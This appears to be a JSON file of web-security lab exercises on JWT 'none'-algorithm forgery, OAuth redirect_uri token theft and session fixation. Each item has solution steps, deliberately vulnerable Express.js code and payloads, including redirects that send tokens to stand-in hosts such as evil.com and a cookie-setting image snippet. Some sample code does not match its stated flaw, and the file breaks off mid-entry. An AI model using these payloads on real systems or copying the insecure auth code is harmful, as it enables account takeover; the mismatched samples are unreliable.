[
  {
    "Lab scenario": "JWT token tampering vulnerability in session management",
    "Lab Description": "The application uses JWTs for user sessions, but incorrectly trusts the `alg` header from the token instead of enforcing HS256. This allows an attacker to forge tokens by setting the algorithm to 'none'. The application fails to verify the token signature properly. To solve: forge an administrator JWT and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite or Postman to log in and capture the issued JWT from the Authorization header.",
      "Decode the JWT using jwt.io or jwt-tool to view its header and payload.",
      "Modify the header to { \"alg\": \"none\" } and set payload to { \"username\": \"admin\" }",
      "Remove the signature part of the JWT and resend the forged token via Authorization: Bearer [token]",
      "Visit /admin/dashboard to confirm admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'supersecretkey'; app.use(express.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.payload.username === 'admin') { res.send('Welcome Admin'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000, () => console.log('JWT Lab running'));",
    "payloads": [
      "{\"alg\":\"none\"}.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "Authorization: Bearer [header].[payload]."
    ]
  },
  {
    "Lab scenario": "OAuth redirection hijack in authentication flow",
    "Lab Description": "The application uses OAuth for login via a third-party provider, but fails to validate the redirect_uri parameter. This allows attackers to hijack the token and redirect it to their own malicious domain. To solve: steal the victim’s token by injecting a malicious redirect_uri and access their data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to initiate an OAuth login and intercept the authorization request.",
      "Modify the redirect_uri parameter to point to your controlled domain (e.g. https://attacker.com/oauth-capture).",
      "Send the modified URL to the victim and wait for them to authorize it.",
      "Capture the token in your controlled domain.",
      "Use the token in the Authorization header to access /user/profile endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const redirect = req.query.redirect_uri; const token = 'victimToken123'; res.redirect(`${redirect}?access_token=${token}`); }); app.get('/user/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'victimToken123') { res.send('Sensitive profile data for victim'); } else { res.status(403).send('Access denied'); } }); app.listen(4000, () => console.log('OAuth Lab running'));",
    "payloads": [
      "https://vulnerable.com/auth?redirect_uri=https://evil.com/oauth-capture",
      "Authorization: Bearer victimToken123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login flow",
    "Lab Description": "The application sets a session ID cookie before authentication and does not regenerate it upon successful login. An attacker can set a known session ID for a victim before they log in and later use that session ID to access the victim's account. To solve: log in as the victim using a fixed session ID to hijack the session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET request to the login page and observe the Set-Cookie: sessionId=abc123",
      "Send the same cookie to the victim and trick them into logging in while using sessionId=abc123",
      "Once the victim logs in, their session is tied to sessionId=abc123",
      "Reuse that session cookie in your browser or Burp",
      "Access /dashboard to confirm you are logged in as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = [{ username: 'victim', password: 'pass123' }]; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.cookie('sessionId', 'abc123'); res.send('<form method=\"POST\">Username: <input name=\"username\"/><br>Password: <input name=\"password\"/><br><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions['abc123'] = username; res.redirect('/dashboard'); } else { res.send('Login failed'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome ${user}`); else res.status(403).send('Unauthorized'); }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionId=abc123",
      "POST /login with username=victim&password=pass123 (from victim’s browser with injected sessionId=abc123)",
      "GET /dashboard with Cookie: sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for user authentication. However, it fails to enforce algorithm validation, allowing tokens signed with 'none' to bypass verification. The application trusts the 'alg' value in the header and processes the token without signature validation. To solve: Craft a tampered token granting 'admin' access and use it to access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a JWT token from an authenticated request using Burp Suite.",
      "Decode the JWT using jwt.io and observe the algorithm set as 'HS256'.",
      "Replace the 'alg' header with 'none' and modify the payload to { \"username\": \"admin\" }.",
      "Remove the signature and reconstruct the token as header.payload (omit the third part).",
      "Send a GET request to /admin with the forged JWT in the Authorization header to gain access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secretkey123'; app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); const payload = jwt.verify(token, secret, { algorithms: [decoded.header.alg] }); if (payload.username === 'admin') res.send('Welcome Admin!'); else res.status(403).send('Access Denied'); }); app.listen(4000, () => console.log('JWT None Algo Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login flow",
    "Lab Description": "The application accepts user-provided session IDs via cookies before login, without regenerating them after successful authentication. This allows attackers to set a known session ID before the victim logs in. To solve: Fixate a session, wait for the victim to authenticate, and hijack their session to access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept a pre-login request and inject a custom session cookie like sessionid=attacker123.",
      "Send the link with embedded cookie to the victim (assume social engineering succeeded).",
      "Wait until the victim logs in and the same session ID becomes authenticated.",
      "Reuse the sessionid=attacker123 from your browser to access the victim's /profile page.",
      "Verify successful session takeover by checking personal details on the profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'vulnsecret', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.username = user.username; res.send('Logged in successfully'); }); app.get('/profile', (req, res) => { if (!req.session.username) return res.status(403).send('Not authenticated'); res.send(`Welcome ${req.session.username}, this is your profile.`); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "Set-Cookie: sessionid=attacker123; Path=/; HttpOnly"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfigured with open redirect on callback",
    "Lab Description": "The application uses OAuth 2.0 with the implicit grant type. The redirection URI is not strictly validated, allowing an attacker to intercept the access token via a malicious redirect URL. To solve: Craft an authorization URL with a redirect_uri pointing to your attacker-controlled site and steal the victim's token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to inspect the OAuth flow and discover the redirect_uri parameter is not validated.",
      "Craft an authorization URL using the victim’s client_id and set redirect_uri to https://attacker.com/capture.",
      "Send the link to the victim. Once clicked, the access_token is included in the fragment of the redirected URL.",
      "On https://attacker.com/capture, use JavaScript to parse the token and send it to your attacker server.",
      "Replay the stolen token in the Authorization header to access /account as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const clients = [{ client_id: 'trusted-client', redirect_uri: 'https://victim.com/callback' }]; const tokens = {}; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (!clients.find(c => c.client_id === client_id)) return res.status(400).send('Invalid client');  let token = 'access-token-xyz'; tokens[client_id] = token; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Object.values(tokens).includes(token)) res.send('Welcome to your account'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Open Redirect Lab running'));",
    "payloads": [
      "https://vulnerable-oauth.com/authorize?response_type=token&client_id=trusted-client&redirect_uri=https://attacker.com/capture",
      "https://attacker.com/capture#access_token=access-token-xyz"
    ]
  },
  {
    "Lab scenario": "Session Fixation in Cookie-based Authentication",
    "Lab Description": "The application uses a session cookie to manage authenticated state. However, it accepts arbitrary session IDs from unauthenticated users and does not regenerate the session ID after login, enabling session fixation. The application fails to invalidate old sessions. To solve: Hijack Carlos's session by fixing a session ID before login and accessing his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a request to GET /login and manually set a crafted session cookie like sessionid=attacker123",
      "Forward the request and log in using Carlos's credentials while keeping the session ID fixed",
      "Confirm that the server maintains the same sessionid after login (check in Burp Repeater)",
      "Use Postman or your browser to access /my-account using the sessionid=attacker123 as a cookie",
      "Verify access to Carlos's account without knowing his credentials"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'password123' }]; let sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); sessions[sid] = username; res.cookie('sessionid', sid); res.send(`Welcome, ${username}`); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sessionid]; if (!username) return res.status(403).send('Not logged in'); res.send(`Account page of ${username}`); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "POST /login with sessionid=attacker123 and carlos's credentials",
      "GET /my-account with sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in Bearer Token Authentication",
    "Lab Description": "The application uses JWTs to manage user sessions, but fails to verify the signing algorithm correctly. By modifying the JWT to use 'alg':'none' and removing the signature, an attacker can spoof any user's token. To solve: Tamper with a JWT to impersonate Carlos and access the protected dashboard.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite or Postman to intercept an authenticated request and copy the JWT",
      "Decode the JWT using jwt.io or CyberChef, and change the payload to {\"username\": \"carlos\"} and header to {\"alg\":\"none\"}",
      "Remove the signature portion of the JWT (leave two parts only)",
      "Use the modified token in the Authorization: Bearer header to access /dashboard",
      "Verify Carlos's dashboard loads, confirming privilege escalation"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const secret = 'secret123'; app.use(require('body-parser').json()); app.get('/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.username) return res.send(`Welcome, ${payload.username}`); return res.status(403).send('Invalid token'); } try { const user = jwt.verify(token, secret); res.send(`Welcome, ${user.username}`); } catch (e) { res.status(403).send('Invalid JWT'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"none\"}",
      "Payload: {\"username\":\"carlos\"}",
      "JWT: base64(header).base64(payload). (no signature)",
      "Authorization: Bearer <tampered JWT>"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Authorization Flow",
    "Lab Description": "The app uses OAuth 2.0 to authenticate users via a third-party provider, but it exposes the authorization code in a GET request and does not validate the redirect URI. This allows an attacker to intercept a code meant for another user and exchange it for an access token. To solve: Hijack Carlos's OAuth code and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to proxy traffic and monitor the GET /oauth-callback?code=<code> request during login",
      "Trigger Carlos to log in via phishing or clickjacking and capture his code in a malicious redirect URI",
      "Use Postman to craft a POST request to /oauth/token with the stolen code",
      "Use the received access_token to make a GET request to /user-info",
      "Verify access to Carlos's data by confirming his email or username"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const tokenRes = await axios.post('https://oauth-provider.com/token', { code, client_id: 'xyz', client_secret: 'abc' }); const token = tokenRes.data.access_token; const userRes = await axios.get('https://oauth-provider.com/user', { headers: { Authorization: `Bearer ${token}` } }); res.send(`Logged in as ${userRes.data.username}`); }); app.listen(4000);",
    "payloads": [
      "GET /oauth-callback?code=intercepted-code",
      "POST /oauth/token with intercepted code",
      "GET /user-info with Authorization: Bearer <stolen-token>"
    ]
  },
  {
    "Lab scenario": "JWT Signature Bypass using 'none' algorithm in Authorization Header",
    "Lab Description": "This lab's authentication system uses JWTs to authorize users. The application does not properly validate the JWT algorithm, allowing attackers to set the alg to 'none'. This lets attackers forge tokens without a signature. To solve the lab, craft a JWT to impersonate the user Carlos and access his account page.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept JWT using Burp Suite's Proxy during login request.",
      "Copy the original token and decode it using jwt.io or Burp Decoder.",
      "Change the 'alg' field in header to 'none' and the 'sub' claim to 'carlos'. Remove the signature section.",
      "Send the tampered token using Postman or Burp Repeater in the Authorization: Bearer header.",
      "Access /my-account with the forged token to verify successful bypass."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = ['wiener', 'carlos']; app.post('/login', (req, res) => { const { username } = req.body; if (!users.includes(username)) return res.status(403).send('Invalid user'); const token = jwt.sign({ sub: username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); res.send(`Account page for ${decoded.sub}`); } catch (err) { res.status(401).send('Unauthorized'); } }); app.listen(3000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MifQ.",
      "{\"alg\":\"none\"}.{\"sub\":\"carlos\"}."
    ]
  },
  {
    "Lab scenario": "Session Fixation Vulnerability in Login Flow",
    "Lab Description": "The application sets the session ID before authentication, allowing attackers to fix a victim's session ID. If a victim logs in using the fixed session, the attacker can hijack the session. To solve the lab, fix the session ID for Carlos, wait for login, and hijack his session to access his account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a GET request to /login to obtain a pre-authentication session cookie using Burp or Postman.",
      "Use social engineering or simulate victim login with this fixed session ID (e.g., via stored XSS or link delivery).",
      "After victim logs in, replay the session ID in your own browser using Burp's Cookie editor.",
      "Visit /my-account with the hijacked session.",
      "Verify access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'pass123' }]; const sessions = {}; app.get('/login', (req, res) => { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); res.send('<form method=\"POST\"><input name=\"username\" /><input name=\"password\" /></form>'); }); app.post('/login', (req, res) => { const { sid } = req.cookies; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid] = username; res.send(`Welcome ${username}`); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user) { res.send(`Account: ${user}`); } else { res.status(401).send('Not authenticated'); } }); app.listen(3000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login -> Set-Cookie: sid=attackersession",
      "Cookie: sid=attackersession after victim logs in",
      "Hijack fixed session cookie post-authentication"
    ]
  },
  {
    "Lab scenario": "OAuth Redirect URI Manipulation Leads to Access Token Theft",
    "Lab Description": "The application uses OAuth 2.0 for login, but does not validate the redirect_uri parameter strictly. An attacker can manipulate this to redirect the OAuth token to a malicious domain. To solve: exploit this flaw to steal Carlos's access token and access his account via the API.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth flow and vulnerable endpoint using OWASP ZAP or Burp Suite.",
      "Craft a malicious redirect_uri pointing to your attacker server (e.g., ngrok.io).",
      "Send a phishing link with the malicious redirect_uri to the victim (Carlos).",
      "Capture the access_token in your attacker server logs.",
      "Use Postman or curl with the stolen token to call /api/userinfo and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'access_token_for_carlos'; const uri = `${redirect_uri}?access_token=${token}`; res.redirect(uri); }); app.get('/my-account', (req, res) => { const token = req.query.access_token; if (token === 'access_token_for_carlos') res.send('Carlos Account Accessed'); else res.status(401).send('Invalid token'); }); app.listen(3000, () => console.log('OAuth Redirect URI Lab running'));",
    "payloads": [
      "https://vulnerable-site.com/auth?redirect_uri=https://attacker.com/callback",
      "https://attacker.com/callback?access_token=access_token_for_carlos",
      "GET /my-account?access_token=access_token_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL Parameter Injection in Login Endpoint",
    "Lab Description": "The login mechanism allows user-supplied session IDs to be set via a query parameter before authentication. The application binds the provided session ID to the authenticated session without validation. To solve: Hijack Carlos's session by forcing him to use a fixed session ID and then authenticate using it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept the login GET request before authenticating. Note that a 'sessionId' parameter can be injected via URL.",
      "2. Log in with your own account using a custom sessionId (e.g., sessionId=abc123). Observe that the server sets this ID as the authenticated session.",
      "3. Host a malicious link (e.g., http://vulnerable.site/login?sessionId=abc123) and trick Carlos into clicking it via social engineering or phishing.",
      "4. Once Carlos uses the link, the session will be fixed. Log in yourself using Carlos’s credentials and confirm the session is shared.",
      "5. Visit /my-account while authenticated to verify you have hijacked Carlos’s session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'letmein' }]; app.use((req, res, next) => { let sid = req.query.sessionId || req.cookies.sessionId; if (!sid) { sid = Math.random().toString(36).substring(2); } res.cookie('sessionId', sid); req.session = sessions[sid] = sessions[sid] || {}; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send(`Welcome, ${username}`); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account details for ${req.session.user}`); else res.status(401).send('Not authenticated'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
    "payloads": [
      "http://vulnerable.site/login?sessionId=abc123",
      "POST /login with sessionId=abc123 in cookie",
      "Set-Cookie: sessionId=abc123"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass using 'none' Algorithm in Token Verification Logic",
    "Lab Description": "The server uses JWTs for authentication but improperly accepts tokens signed with the 'none' algorithm, trusting unsigned tokens. To solve: Forge a valid JWT for Carlos with 'none' as algorithm, gain access to his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to log in and capture the Authorization: Bearer <token> header from your response.",
      "2. Decode the JWT at jwt.io and observe the 'alg' field (likely HS256). Change it to 'none' and set payload to {\"username\":\"carlos\"}.",
      "3. Remove the signature part entirely (only header and payload remain, separated by two dots).",
      "4. Replace your Authorization header with the tampered JWT.",
      "5. Visit the /my-account endpoint while authenticated using the fake token to confirm privilege escalation."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'letmein') { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { const authHeader = req.headers.authorization; const token = authHeader && authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, secret, { algorithms: ['HS256', 'none'] }); res.send(`Welcome to ${decoded.username}'s account`); } catch (e) { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running...'));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "Authorization: Bearer <header>.<payload>.",
      "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Grant Token Leak via Referer Header in Third-Party Redirect",
    "Lab Description": "The application uses the OAuth implicit grant flow and redirects users to third-party pages after authentication, including the access token in the URL fragment. Due to misconfigured Referer policies, the token leaks to external domains. To solve: Extract Carlos’s access token and impersonate him.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to observe the OAuth flow. Note that the redirect_uri includes a third-party page like http://attacker.site/welcome.html#access_token=...",
      "2. Intercept the final OAuth redirect request using a victim account (e.g., Carlos). Confirm that the access token is visible in the Referer header to attacker.site.",
      "3. Set up a malicious third-party page (e.g., using ngrok) that logs document.referrer when the victim lands on it after authentication.",
      "4. Force Carlos to log in via OAuth using a phishing or crafted redirect link.",
      "5. Retrieve the access token from your server logs and use it as Bearer token to access the /my-account endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': 'carlos' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'abc123'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const user = tokens[token]; if (user) res.send(`Sensitive account data of ${user}`); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
    "payloads": [
      "http://attacker.site/log.html#access_token=abc123",
      "redirect_uri=http://attacker.site/log.html",
      "Referer: http://attacker.site/log.html#access_token=abc123"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login endpoint",
    "Lab Description": "This lab's login functionality does not invalidate the pre-authentication session identifier, making it vulnerable to session fixation. The application sets a session ID before login and continues using it afterward. To solve: log in to Carlos's account using a fixed session value you've injected before authentication.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using OWASP ZAP, send a GET /login request to observe the initial session ID in the Set-Cookie header.",
      "2.In Postman, craft a login request with valid credentials and reuse the fixed session ID from the previous unauthenticated request.",
      "3.Observe that the session ID remains unchanged even after login.",
      "4.Share the session ID with the victim beforehand, then log in yourself using their credentials while reusing the same ID.",
      "5.Visit /my-account using the fixed session to confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'fixed-session', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); req.session.user = user.username; res.send('Login successful'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "GET /login → Extract Set-Cookie: sessionID",
      "POST /login with Cookie: sessionID=value",
      "Access /my-account with the same Cookie"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in Authorization header",
    "Lab Description": "The application uses JWTs for authentication but does not verify the token signature properly if the 'alg' field is set to 'none'. This flaw allows attackers to craft arbitrary tokens and impersonate users. To solve: forge a JWT token that identifies you as Carlos without knowing the secret key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite to intercept a request after logging in and extract the JWT from the Authorization header.",
      "2.In jwt.io, decode the token and note the structure (header, payload, signature).",
      "3.Replace the algorithm in the header with 'none' and modify the payload to set the username to carlos.",
      "4.Remove the signature and craft a new token with just the base64url-encoded header and payload.",
      "5.Use Postman to resend a request to /my-account with the forged token in the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username }, secret); res.json({ token }); }); app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); // FLAW: doesn't verify signature if alg is 'none' if (payload && payload.payload.user) { return res.send(`Welcome ${payload.payload.user}`); } res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('JWT None Algorithm Lab running'));",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\"}",
      "Token: base64url(header).base64url(payload)."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in redirect_uri validation during implicit flow",
    "Lab Description": "This lab uses OAuth2 for login via a third-party provider but does not strictly validate the `redirect_uri` during the authorization flow. An attacker can manipulate the URL to capture tokens. To solve: steal Carlos's OAuth token by injecting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.In the browser, begin the OAuth login flow and observe the redirect URI being sent.",
      "2.Use Burp Suite to intercept the authorization request and modify the `redirect_uri` to point to your attacker domain (e.g., https://evil.com).",
      "3.Craft a phishing link to the victim using this manipulated redirect URI and send it to Carlos.",
      "4.Once Carlos logs in, the access token is sent to your malicious domain via the fragment (#access_token=...).",
      "5.Use the stolen token in Postman to access /my-account as Carlos by setting the Authorization header."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const validRedirects = ['https://ourapp.com/callback']; app.get('/auth', (req, res) => { const { redirect_uri } = req.query;  res.redirect(`${redirect_uri}#access_token=carlos-token`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer carlos-token') return res.send('Welcome Carlos'); res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running'));",
    "payloads": [
      "https://authserver.com/auth?redirect_uri=https://evil.com",
      "Victim logs in → access_token is leaked to https://evil.com",
      "Use stolen token: Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session fixation in login flow",
    "Lab Description": "The application's login logic is vulnerable to session fixation. The app fails to generate a new session ID after login, allowing an attacker to preset a session ID and force the victim to use it. The application accepts session identifiers via cookies and doesn't invalidate pre-login sessions. To solve: hijack Carlos's session and access the /my-account page using a fixed session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept your GET /login request and set a custom cookie: sessionid=attacker123",
      "2.Observe that after a successful login, the same sessionid persists and isn't regenerated.",
      "3.Log out and craft a phishing link containing the fixed session cookie using JavaScript in an HTML email (e.g., <img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>).",
      "4.Send the crafted email to the victim (Carlos) and wait for him to log in while using the fixed session.",
      "5.Once Carlos authenticates using the fixed session, access the /my-account endpoint using the same sessionid=attacker123 cookie."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'static-secret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'letmein' }]; app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"/><input name=\"password\"/><button>Login</button></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.user) return res.send(`Welcome ${req.session.user}`); res.status(401).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Cookie: sessionid=attacker123",
      "<img src='/login' onload='document.cookie=\"sessionid=attacker123\"'>",
      "GET /my-account HTTP/1.1\\nCookie: sessionid=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT tampering via 'none' algorithm in REST API",
    "Lab Description": "The API uses JWT tokens for user identity validation but insecurely accepts unsigned tokens with the 'none' algorithm. It does not properly verify the signature, allowing attackers to forge arbitrary tokens. To solve: craft a JWT token impersonating Carlos and access the /my-account endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Postman to authenticate as a normal user and capture the Authorization: Bearer <JWT> token.",
      "2.Decode the JWT using jwt.io and inspect the header and payload. Note the 'alg': 'HS256'.",
      "3.Craft a new token using header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }",
      "4.Base64 encode the header and payload, and omit the signature (empty string after two dots).",
      "5.Use Postman to send the forged token in Authorization header and access /my-account."
    ],
    "Vulnerability name": "Authentication",
